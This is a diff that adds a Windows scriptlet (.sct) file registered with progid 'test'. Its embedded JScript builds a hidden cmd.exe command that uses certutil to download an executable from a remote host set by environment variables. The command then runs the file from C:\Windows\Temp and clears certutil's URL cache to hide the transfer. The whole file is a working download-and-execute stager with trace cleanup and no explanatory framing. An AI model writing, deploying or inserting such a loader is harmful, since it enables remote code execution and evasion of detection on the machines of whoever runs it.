@@ -1,0 +1,27 @@
+<scriptlet>      
+  <registration progid="test" classid="{F0001111-0000-0000-0000-0000FEEDACDC}">      
+    <script language="JScript">      
+      <![CDATA[      
+        var shell = new ActiveXObject("WScript.Shell");
+        var env = shell.Environment("Process");
+        
+        // Dynamic variables from environment
+        var lhost = env("IP")   || "127.0.0.1";
+        var lport = env("PORT") || "80";
+        var file  = env("EXE")  || "s.exe";
+        
+        var remote = "http://" + lhost + ":" + lport + "/" + file;
+        var local  = "C:\\Windows\\Temp\\" + file;
+        
+        // Command sequence: Download -> Execute -> Wait 2s -> Delete Cache
+        // Using -f to force and -urlcache to manage the transfer
+        var cmd = "cmd.exe /c certutil -urlcache -f " + remote + " " + local + 
+                  " && " + local + 
+                  " && timeout /t 2 && certutil -urlcache -f " + remote + " delete";
+        
+        // 0 = Hidden window
+        shell.Run(cmd, 0);      
+      ]]>      
+    </script>      
+  </registration>      
+</scriptlet>
